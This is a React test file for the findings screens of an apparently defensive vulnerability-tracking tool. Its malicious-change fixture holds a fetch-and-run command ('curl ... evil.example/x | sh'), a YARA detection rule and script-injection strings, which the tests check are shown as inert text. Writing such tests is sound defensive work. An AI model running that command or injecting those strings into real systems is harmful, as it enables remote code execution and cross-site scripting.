import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, Route, Routes } from "react-router-dom";
import { afterEach, expect, it, vi } from "vitest";
import { FindingDetail, FindingForm, FindingsList } from "./Findings";
import { setCsrfToken } from "../api";

afterEach(() => {
  vi.unstubAllGlobals();
  setCsrfToken(undefined);
});
const application = {
  id: "application",
  asset_name: "Customer portal",
  asset_url: "https://example.test",
  product_kind: "cms",
  product_name: "Example CMS",
  monitor_interval_seconds: 604800,
  monitor_enabled: true,
  archived: false,
  source_generation: 1,
  last_check_at: null,
  next_check_at: null,
  repositories: [],
  version: null,
  config: {},
};
const summary = {
  id: "finding",
  application_id: "application",
  source: "commit",
  source_ref: "abc1234",
  cve_id: null,
  title: "Stored XSS in timezone settings",
  status: "open",
  cause: { by: "operator", at: "2026-10-06T00:00:00Z" },
  deployed_version: "unknown",
  affected_versions: [
    { product: "Example CMS", range: "<= 9.5.3", source: "Pinned source" },
  ],
  fixed_versions: [
    { product: "Example CMS", version: "9.5.4", fix_commit: "a".repeat(40) },
  ],
  target_applicability: "unknown",
  artifact_revision: "revision",
  lab_status: "verified",
  artifact_state: {
    status: "complete",
    missing: [],
    limitations: [],
    vulnerable_version: "9.5.3",
  },
  created_at: "2026-10-06T00:00:00Z",
  updated_at: "2026-10-06T00:00:00Z",
};
const detail = {
  ...summary,
  artifacts: [],
  evidence: [],
  events: [],
  lab_runs: [
    { id: "lab", status: "verified", created_at: "2026-10-06T00:00:00Z" },
  ],
};

it("loads compact summaries, renders structured fixed versions, and paginates", async () => {
  const fetch = vi.fn(async (url: string) => {
    const query = new URL(url, "http://localhost").searchParams;
    const item = query.has("cursor")
      ? {
          ...summary,
          id: "second",
          title: "Path traversal in templates",
          fixed_versions: ["10.0.0"],
          lab_status: null,
        }
      : summary;
    return new Response(
      JSON.stringify({
        items: [item],
        next_cursor: query.has("cursor") ? null : "1",
      }),
    );
  });
  vi.stubGlobal("fetch", fetch);
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("link", { name: summary.title }),
  ).toHaveAttribute("href", "/findings/finding");
  expect(screen.getByText("Example CMS 9.5.4")).toBeInTheDocument();
  expect(screen.getByText("Lab verified")).toBeInTheDocument();
  expect(
    new URL(fetch.mock.calls[0][0], "http://localhost").searchParams.get(
      "view",
    ),
  ).toBe("summary");
  await userEvent.setup().click(screen.getByRole("button", { name: /next/i }));
  expect(
    await screen.findByRole("link", { name: "Path traversal in templates" }),
  ).toBeInTheDocument();
  expect(screen.getByText("10.0.0")).toBeInTheDocument();
  expect(screen.getByText("Lab unverified")).toBeInTheDocument();
  expect(screen.queryByText(/unexpected response/i)).not.toBeInTheDocument();
});

it("renders structured ranges in the finding detail", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : detail,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("heading", { name: summary.title }),
  ).toBeInTheDocument();
  expect(screen.getByText("Example CMS <= 9.5.3")).toBeInTheDocument();
  expect(screen.getByText("Example CMS 9.5.4")).toBeInTheDocument();
});

it("preserves structured version evidence and leaves the lifecycle alone when editing", async () => {
  let saved: Record<string, unknown> | undefined;
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (init?.method === "PATCH") {
        saved = JSON.parse(String(init.body));
        return new Response(JSON.stringify({ ...detail, ...saved }));
      }
      return new Response(
        JSON.stringify(
          url === "/api/applications"
            ? { items: [application], next_cursor: null }
            : detail,
        ),
      );
    }),
  );
  setCsrfToken("fixture-csrf");
  render(
    <MemoryRouter initialEntries={["/findings/finding/edit"]}>
      <Routes>
        <Route path="/findings/:id/edit" element={<FindingForm />} />
        <Route path="/findings/:id" element={<h1>Saved finding</h1>} />
      </Routes>
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  const title = await screen.findByLabelText("Title");
  await user.clear(title);
  await user.type(title, "Reviewed title");
  expect(screen.getByLabelText("Source")).toBeDisabled();
  expect(screen.getByLabelText("Affected versions (one per line)")).toHaveValue(
    "Example CMS <= 9.5.3",
  );
  await user.click(screen.getByRole("button", { name: "Save finding" }));
  expect(
    await screen.findByRole("heading", { name: "Saved finding" }),
  ).toBeInTheDocument();
  expect(saved?.title).toBe("Reviewed title");
  expect(saved?.source).toBe("commit");
  expect(saved).not.toHaveProperty("status");
  expect(saved?.affected_versions).toEqual(summary.affected_versions);
  expect(saved?.fixed_versions).toEqual(summary.fixed_versions);
});

it("deletes a false-positive finding after confirmation and returns to its commit", async () => {
  const requests: [string, string][] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      requests.push([init?.method || "GET", url]);
      if (init?.method === "DELETE") return new Response(null, { status: 204 });
      return new Response(
        JSON.stringify(
          url.startsWith("/api/applications/")
            ? application
            : { ...detail, source_commit_id: "commit-1" },
        ),
      );
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
        <Route path="/commits/:id" element={<p>Commit page</p>} />
      </Routes>
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  await user.click(
    await screen.findByRole("button", { name: "Delete finding" }),
  );
  // The first click only arms the action.
  expect(requests.some(([method]) => method === "DELETE")).toBe(false);
  await user.click(screen.getByRole("button", { name: "Delete permanently?" }));
  expect(await screen.findByText("Commit page")).toBeInTheDocument();
  expect(requests).toContainEqual(["DELETE", "/api/findings/finding"]);
});

it("opens a finding recorded before version ranges were stored for commit findings", async () => {
  // Stored before commit findings carried version ranges: both lists are absent.
  const legacy: Record<string, unknown> = {
    ...detail,
    source_commit_id: "commit-1",
  };
  delete legacy.affected_versions;
  delete legacy.fixed_versions;
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : legacy,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("heading", { name: summary.title }),
  ).toBeInTheDocument();
  expect(screen.queryByRole("alert")).not.toBeInTheDocument();
});

it("deletes the selected findings together after confirmation", async () => {
  let items = [
    summary,
    { ...summary, id: "second", title: "Path traversal in templates" },
  ];
  const deletions: unknown[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url === "/api/findings/delete" && init?.method === "POST") {
        const body = JSON.parse(String(init.body)) as { ids: string[] };
        deletions.push(body);
        items = items.filter((f) => !body.ids.includes(f.id));
        return new Response(JSON.stringify({ deleted: body.ids }));
      }
      return new Response(JSON.stringify({ items, next_cursor: null }));
    }),
  );
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  await user.click(
    await screen.findByRole("checkbox", {
      name: "Select all findings on this page",
    }),
  );
  expect(screen.getByRole("status")).toHaveTextContent("2 selected");
  await user.click(
    screen.getByRole("checkbox", {
      name: "Select Path traversal in templates",
    }),
  );
  expect(screen.getByRole("status")).toHaveTextContent("1 selected");
  await user.click(
    screen.getByRole("checkbox", {
      name: "Select Path traversal in templates",
    }),
  );
  const remove = screen.getByRole("button", { name: "Delete 2 findings" });
  await user.click(remove);
  // The first click only arms the action.
  expect(deletions).toEqual([]);
  await user.click(
    screen.getByRole("button", { name: "Delete 2 findings permanently?" }),
  );
  expect(
    await screen.findByRole("heading", { name: "No findings recorded" }),
  ).toBeInTheDocument();
  expect(deletions).toEqual([{ ids: ["finding", "second"] }]);
});

it("lists each finding with its source, lifecycle state and cause", async () => {
  const items = [
    {
      ...summary,
      cause: {
        by: "verdict",
        verdict: "Vulnerability introduced",
        confidence: "high",
        at: "2026-10-06T00:00:00Z",
      },
    },
    {
      ...summary,
      id: "cve",
      source: "cve",
      source_ref: "CVE-2026-1234",
      cve_id: "CVE-2026-1234",
      title: "Template injection",
      status: "remediated",
      cause: { by: "remediation_pr", at: "2026-10-07T00:00:00Z" },
    },
  ];
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async () => new Response(JSON.stringify({ items, next_cursor: null })),
    ),
  );
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  const opened = (
    await screen.findByRole("link", { name: summary.title })
  ).closest("tr")!;
  expect(screen.getByRole("columnheader", { name: "State" })).toBeVisible();
  expect(within(opened).getByText("Commit abc1234")).toBeInTheDocument();
  expect(within(opened).getByText("Open")).toBeInTheDocument();
  expect(
    within(opened).getByText(
      "Vulnerability introduced Verdict, high confidence",
    ),
  ).toBeInTheDocument();
  const remediated = screen
    .getByRole("link", { name: "Template injection" })
    .closest("tr")!;
  expect(within(remediated).getByText("CVE-2026-1234")).toBeInTheDocument();
  expect(within(remediated).getByText("Remediated")).toBeInTheDocument();
  expect(
    within(remediated).getByText("Merged Remediation PR"),
  ).toBeInTheDocument();
});

it("shows the lifecycle, the history of linked changes and the Deployed version separately", async () => {
  const at = "2026-10-06T00:00:00Z";
  const confirmed = {
    ...detail,
    source_commit_id: "commit-1",
    status: "confirmed",
    cause: { by: "operator", reason: "Reproduced by hand", at },
    events: [
      {
        id: "e1",
        created_at: at,
        action: "opened",
        source_ref: "abc1234",
        cause: {
          by: "verdict",
          verdict: "Vulnerability fix",
          confidence: "medium",
          at,
        },
      },
      {
        id: "e2",
        created_at: at,
        action: "linked",
        commit_id: "commit-2",
        revision: "b".repeat(40),
        analysis_id: "analysis-2",
        verdict: "Vulnerability fix",
      },
      {
        id: "e3",
        created_at: at,
        action: "transition",
        from: "open",
        to: "confirmed",
        cause: { by: "operator", reason: "Reproduced by hand", at },
      },
      { id: "e4", created_at: at, action: "artifacts_uploaded" },
    ],
  };
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : confirmed,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
  expect(within(lifecycle).getByText("Confirmed")).toBeInTheDocument();
  expect(
    within(lifecycle).getByText("Operator: Reproduced by hand"),
  ).toBeInTheDocument();
  const history = screen.getByRole("region", { name: "History" });
  const [opened, linked, transition, uploaded] =
    within(history).getAllByRole("listitem");
  expect(opened).toHaveTextContent("Opened");
  expect(opened).toHaveTextContent("Commit abc1234");
  expect(opened).toHaveTextContent(
    "Vulnerability fix Verdict, medium confidence",
  );
  expect(linked).toHaveTextContent("Vulnerability fix");
  expect(within(linked).getByRole("link", { name: "bbbbbbb" })).toHaveAttribute(
    "href",
    "/commits/commit-2",
  );
  expect(transition).toHaveTextContent("Open → Confirmed");
  expect(transition).toHaveTextContent("Operator: Reproduced by hand");
  expect(uploaded).toHaveTextContent("Artifacts uploaded");
  const deployed = screen.getByText("Deployed version").closest("div")!;
  expect(deployed).toHaveTextContent("Unknown");
  expect(
    screen.getByText(
      "A fix in the repository does not mean the Asset serves it.",
    ),
  ).toBeInTheDocument();
  expect(screen.queryByText("Operator status")).not.toBeInTheDocument();
});

it("confirms, dismisses and marks a finding remediated with a reason", async () => {
  let current: Record<string, unknown> = { ...detail };
  const posted: { body: unknown; csrf: string | null }[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (url === "/api/findings/finding/transitions") {
        const body = JSON.parse(String(init?.body)) as {
          state: string;
          reason: string;
        };
        posted.push({
          body,
          csrf: new Headers(init?.headers).get("X-CSRF-Token"),
        });
        current = {
          ...current,
          status: body.state,
          cause: { by: "operator", reason: body.reason },
        };
      }
      return new Response(JSON.stringify(current));
    }),
  );
  setCsrfToken("token");
  const view = () =>
    render(
      <MemoryRouter initialEntries={["/findings/finding"]}>
        <Routes>
          <Route path="/findings/:id" element={<FindingDetail />} />
        </Routes>
      </MemoryRouter>,
    );
  const user = userEvent.setup();
  const enabled = async (reason: string) => {
    const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
    await user.type(within(lifecycle).getByLabelText("Reason"), reason);
    return ["Confirm", "Dismiss", "Mark remediated"].filter(
      (name) =>
        !within(lifecycle)
          .getByRole("button", { name })
          .hasAttribute("disabled"),
    );
  };
  const { unmount } = view();
  const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
  // An empty reason blocks every action.
  for (const name of ["Confirm", "Dismiss", "Mark remediated"])
    expect(within(lifecycle).getByRole("button", { name })).toBeDisabled();
  expect(await enabled("Reproduced in the lab")).toEqual([
    "Confirm",
    "Dismiss",
    "Mark remediated",
  ]);
  await user.click(within(lifecycle).getByRole("button", { name: "Confirm" }));
  expect(await within(lifecycle).findByText("Confirmed")).toBeInTheDocument();
  expect(posted).toEqual([
    {
      body: { state: "confirmed", reason: "Reproduced in the lab" },
      csrf: "token",
    },
  ]);
  expect(await enabled("Patched upstream")).toEqual(["Mark remediated"]);
  await user.click(
    within(lifecycle).getByRole("button", { name: "Mark remediated" }),
  );
  expect(await within(lifecycle).findByText("Remediated")).toBeInTheDocument();
  expect(posted[1].body).toEqual({
    state: "remediated",
    reason: "Patched upstream",
  });
  unmount();
  current = { ...detail };
  view();
  await enabled("Not reachable");
  await user.click(
    within(await screen.findByRole("region", { name: "Lifecycle" })).getByRole(
      "button",
      { name: "Dismiss" },
    ),
  );
  expect(
    await within(screen.getByRole("region", { name: "Lifecycle" })).findByText(
      "Dismissed",
    ),
  ).toBeInTheDocument();
  expect(posted[2].body).toEqual({
    state: "dismissed",
    reason: "Not reachable",
  });
  expect(await enabled("Reopen")).toEqual([]);
});

it("starting a Lab asks for the Operator's password", async () => {
  const posted: { body: unknown; key: string | null }[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (url === "/api/findings/finding/lab-runs") {
        posted.push({
          body: JSON.parse(String(init?.body)),
          key: new Headers(init?.headers).get("Idempotency-Key"),
        });
        return posted.length === 1
          ? new Response(
              JSON.stringify({
                code: "approval_refused",
                message: "The password is incorrect; nothing was approved",
              }),
              { status: 403 },
            )
          : new Response(
              JSON.stringify({
                job_id: "job-lab",
                status_url: "/api/jobs/job-lab",
              }),
              { status: 202 },
            );
      }
      return new Response(
        JSON.stringify({
          ...detail,
          events: [
            {
              id: "approved",
              action: "approved",
              approved: "lab_run",
              job_id: "job-lab",
              created_at: "2026-10-06T00:00:00Z",
            },
          ],
          lab_runs: [
            {
              id: "lab",
              status: "not_reproduced",
              created_at: "2026-10-06T00:00:00Z",
            },
          ],
        }),
      );
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(await screen.findByText("Lab not reproduced")).toBeInTheDocument();
  expect(screen.getByText("Not reproduced")).toBeInTheDocument();
  expect(screen.getByText("Approved · Lab")).toBeInTheDocument();
  const user = userEvent.setup();
  await user.click(screen.getByRole("button", { name: "Start Lab" }));
  const dialog = await screen.findByRole("dialog");
  const password = within(dialog).getByLabelText("Password");
  expect(password).toHaveAttribute("type", "password");
  await user.type(password, "wrong-password");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  expect(
    await within(dialog).findByText(
      "The password is incorrect; nothing was approved",
    ),
  ).toBeInTheDocument();
  expect(screen.getByRole("dialog")).toBeInTheDocument();
  await user.clear(password);
  await user.type(password, "test-password-long");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  await vi.waitFor(() =>
    expect(screen.queryByRole("dialog")).not.toBeInTheDocument(),
  );
  expect(posted.map((p) => p.body)).toEqual([
    { password: "wrong-password" },
    { password: "test-password-long" },
  ]);
  expect(posted.every((p) => p.key)).toBe(true);
});

// A Malicious change's static Proof (A07): T1's postinstall fixture, as the backend stores it.
const at = "2026-11-01T00:00:00Z";
const rule =
  'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them } // <script>alert("rule")</script>';
const malicious = {
  ...detail,
  title: "Postinstall loader in package.json",
  source_commit_id: "commit-1",
  status: "confirmed",
  cause: { by: "detection_rule", artifact_revision: "revision", at },
  malicious_change: true,
  lab_runs: [],
  artifact_state: {
    status: "complete",
    missing: [],
    limitations: [],
    vulnerable_version: null,
  },
  static_proof: {
    analysis_id: "analysis-1",
    artifact_revision: "revision",
    files: ["detection-rule.yar", "indicators.json", "report.md"],
    rule,
    status: "validated",
    job_id: "job-rule",
    checks: [
      {
        name: "rule",
        status: "passed",
        message: "The Detection rule compiles",
      },
      {
        name: "changed",
        status: "passed",
        message:
          "The Detection rule matches files this commit added or changed",
        files: ["package.json"],
        count: 1,
      },
      {
        name: "parent",
        status: "passed",
        message: "The Detection rule matches no file in the parent tree",
        files: [],
        count: 0,
      },
      {
        name: "baseline",
        status: "passed",
        message: "The Detection rule matches no file in the Baseline tree",
        files: [],
        count: 0,
      },
    ],
    indicators: {
      files: [{ path: "package.json", sha256: "c".repeat(64) }],
      hosts: ["evil.example"],
      urls: ["https://evil.example/x?<script>alert(1)</script>"],
      commands: ["curl -s https://evil.example/x | sh"],
      rejected: [
        {
          kind: "host",
          value: "cdn.shop.example",
          reason: "Not in the lines this commit added",
        },
      ],
    },
  },
  cleanup_report: {
    analysis_id: "analysis-1",
    commits: [
      { revision: "a".repeat(40), commit_id: "commit-1" },
      { revision: "b".repeat(40), commit_id: null },
    ],
    commits_truncated: true,
    releases: ["v1.0.1"],
    secrets: ["The npm publish token in CI"],
  },
};
function showFinding(finding: Record<string, unknown>) {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : finding,
          ),
        ),
    ),
  );
  return render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
}

it("shows the static Proof with each validation check and the cleanup report as text", async () => {
  const { container } = showFinding(malicious);
  const proof = await screen.findByRole("region", { name: "Static Proof" });
  expect(within(proof).getByText("Validated")).toBeInTheDocument();
  expect(within(proof).getByRole("link", { name: /View job/ })).toHaveAttribute(
    "href",
    "/jobs/job-rule",
  );
  for (const label of [
    "Rule compiles",
    "Matches a file the commit changed",
    "Matches nothing in the parent tree",
    "Matches nothing in the Baseline",
  ])
    expect(within(proof).getByText(label).closest("div")).toHaveTextContent(
      "Passed",
    );
  expect(
    within(proof).getByText("Matches a file the commit changed").closest("div"),
  ).toHaveTextContent("package.json");
  // The rule and every indicator are text: nothing in them is ever markup.
  expect(within(proof).getByText(rule).tagName).toBe("PRE");
  expect(within(proof).getByText("c".repeat(64))).toBeInTheDocument();
  expect(within(proof).getByText("evil.example")).toBeInTheDocument();
  expect(
    within(proof).getByText("https://evil.example/x?<script>alert(1)</script>"),
  ).toBeInTheDocument();
  expect(
    within(proof).getByText("curl -s https://evil.example/x | sh"),
  ).toBeInTheDocument();
  expect(
    within(proof)
      .getByText(/cdn\.shop\.example/)
      .closest("li"),
  ).toHaveTextContent("Not in the lines this commit added");
  expect(container.querySelector("script")).toBeNull();

  const report = screen.getByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("package.json")).toBeInTheDocument();
  expect(
    within(report).getByText(
      "https://evil.example/x?<script>alert(1)</script>",
    ),
  ).toBeInTheDocument();
  expect(within(report).getByRole("link", { name: "aaaaaaa" })).toHaveAttribute(
    "href",
    "/commits/commit-1",
  );
  expect(within(report).getByText("bbbbbbb")).toBeInTheDocument();
  expect(within(report).getByText(/and more/)).toBeInTheDocument();
  expect(within(report).getByText("v1.0.1")).toBeInTheDocument();
  expect(
    within(report).getByText("The npm publish token in CI"),
  ).toBeInTheDocument();
  expect(
    within(report)
      .getByText("Detection rule to run on the server")
      .closest("div"),
  ).toHaveTextContent("Validated");
  expect(
    within(screen.getByRole("region", { name: "Lifecycle" })).getByText(
      "Validated Detection rule",
    ),
  ).toBeInTheDocument();
});

it("names the failed Detection rule check and keeps the artifacts Draft", async () => {
  showFinding({
    ...malicious,
    status: "open",
    cause: {
      by: "verdict",
      verdict: "Malicious change",
      confidence: "high",
      at,
    },
    artifact_state: {
      status: "draft",
      missing: [],
      limitations: ["The Detection rule also matches files in the parent tree"],
      vulnerable_version: null,
    },
    static_proof: {
      ...malicious.static_proof,
      status: "failed",
      checks: [
        malicious.static_proof.checks[0],
        malicious.static_proof.checks[1],
        {
          name: "parent",
          status: "failed",
          message: "The Detection rule also matches files in the parent tree",
          files: ["server.js"],
          count: 1,
        },
        {
          name: "baseline",
          status: "skipped",
          message: "A Backfill commit is checked against its parent tree only",
        },
      ],
    },
    cleanup_report: { ...malicious.cleanup_report, releases: null },
  });
  const proof = await screen.findByRole("region", { name: "Static Proof" });
  const parent = within(proof)
    .getByText("Matches nothing in the parent tree")
    .closest("div")!;
  expect(parent).toHaveTextContent("Failed");
  expect(parent).toHaveTextContent(
    "The Detection rule also matches files in the parent tree",
  );
  expect(within(parent).getByText("server.js")).toBeInTheDocument();
  expect(
    within(proof).getByText("Matches nothing in the Baseline").closest("div"),
  ).toHaveTextContent("Skipped");
  expect(screen.getByText("Artifacts").closest("span")).toHaveTextContent(
    "Draft",
  );
  const lifecycle = screen.getByRole("region", { name: "Lifecycle" });
  expect(within(lifecycle).getByText("Open")).toBeInTheDocument();
  expect(
    within(lifecycle).getByText("Malicious change Verdict, high confidence"),
  ).toBeInTheDocument();
  const report = screen.getByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
    "Unknown",
  );
});

it("never shows releases none of the stored commits had as none", async () => {
  showFinding({
    ...malicious,
    cleanup_report: { ...malicious.cleanup_report, releases: [] },
  });
  const report = await screen.findByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
    "None found among the stored commits; not ruled out",
  );
});

it("offers no Lab and no generation for a Malicious change Finding", async () => {
  const { unmount } = showFinding({
    ...malicious,
    artifact_state: {
      status: "draft",
      missing: ["detection-rule.yar"],
      limitations: [],
      vulnerable_version: null,
    },
  });
  expect(
    await screen.findByText(
      "Missing: detection-rule.yar. The static Proof is complete once its Detection rule validates.",
    ),
  ).toBeInTheDocument();
  expect(
    screen.queryByRole("button", { name: "Start Lab" }),
  ).not.toBeInTheDocument();
  expect(screen.queryByRole("region", { name: "Lab" })).not.toBeInTheDocument();
  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
  expect(
    screen.queryByRole("button", { name: "Generate" }),
  ).not.toBeInTheDocument();
  const user = userEvent.setup();
  await user.click(
    screen.getByRole("button", { name: "Upload missing files" }),
  );
  const dialog = await screen.findByRole("dialog");
  expect(
    within(dialog).getByLabelText("Detection rule (detection-rule.yar)"),
  ).toBeInTheDocument();
  expect(
    within(dialog).queryByLabelText("Python PoC (poc.py)"),
  ).not.toBeInTheDocument();
  unmount();
  showFinding({
    ...detail,
    cause: { by: "verdict", verdict: "Vulnerability introduced", at },
  });
  expect(
    await screen.findByRole("button", { name: "Start Lab" }),
  ).toBeInTheDocument();
  expect(screen.getByRole("button", { name: "Generate" })).toBeInTheDocument();
  expect(
    screen.queryByRole("region", { name: "Static Proof" }),
  ).not.toBeInTheDocument();
});
